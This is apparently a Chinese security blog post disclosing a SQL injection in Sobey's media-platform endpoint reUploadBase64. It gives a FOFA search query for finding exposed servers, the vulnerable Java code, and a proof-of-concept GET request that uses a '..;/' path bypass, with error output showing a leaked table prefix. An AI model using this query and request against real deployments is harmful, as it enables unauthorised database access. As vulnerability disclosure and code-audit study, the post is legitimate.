---
title: "索贝融媒体 /sobey-mchEditor/mch/TestInt/reUploadBase64 SQL注入漏洞"
source: https://mrxn.net/jswz/sobey-TestInt-reUploadBase64-sqli.html
asset_dir: assets/索贝融媒体-sobey-mcheditormchtestintreuploadbase64-sql注入漏洞
---

# 索贝融媒体 /sobey-mchEditor/mch/TestInt/reUploadBase64 SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/22 08:27
* 728浏览
* [0评论](#comment)
* 12分钟阅读

深入探索

安全

计算机安全

sql


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

索贝产品中的 /sobey-mchEditor/mch/TestInt/reUploadBase64 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。

SQL注入防护

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

深入探索

数据库

SQL

物流软件安全

根据漏洞信息看下`mch/TestInt/reUploadBase64`的实现逻辑

```
@RequestMapping(
    value = {"/reUploadBase64"},
    method = {RequestMethod.GET}
)
public Response reUploadBase64(@RequestParam(value = "ids",required = false) String ids, String token) {
    QueryBuilder qb = new QueryBuilder("select id from zcnarticle where 1=1 ");
    if (!StringUtils.isEmpty(ids)) {
        SchemaSQLUtil.appendInCondition(qb, "id", Arrays.asList(ids.split(",")));
    } else {
        qb.append("  and content like '%base64,%' union  select id from zcnarticle where 1=1 and logo like '%base64,%' ");
    }

    List<Map<String, Object>> rows = qb.executeAliasListMap();
```

深入探索

ids

软件

入侵检测系统

参数**ids**无任何过滤或校验处理，被直接拼接到qb这个sql语句中执行，从而造成了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞；但是ids会被逗号分割，因此利用有限。

代码安全审计

# 漏洞复现

```
GET /sobey-mchEditor/js/..;/mch/TestInt/reUploadBase64?ids=SQLI_POC&siteCode=1&token=1 HTTP/1.1
Host: sobey.mrxn.net
```

[![索贝融媒体 /sobey-mchEditor/mch/TestInt/reUploadBase64 SQL注入漏洞](images/img-001-6b5f004d4a34.webp)](https://image.mrxn.net/2f02877a84934ca589104f2b0aa90a25.webp)

报错回显获取到当前表名前缀 articl\_c7ee17

漏洞修复方案

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[索贝融媒体 /sobey-mchEditor/mch/TestInt/reUploadBase64 SQL注入漏洞](https://mrxn.net/jswz/sobey-TestInt-reUploadBase64-sqli.html)  
文章链接：<https://mrxn.net/jswz/sobey-TestInt-reUploadBase64-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-TestInt-reUploadBase64-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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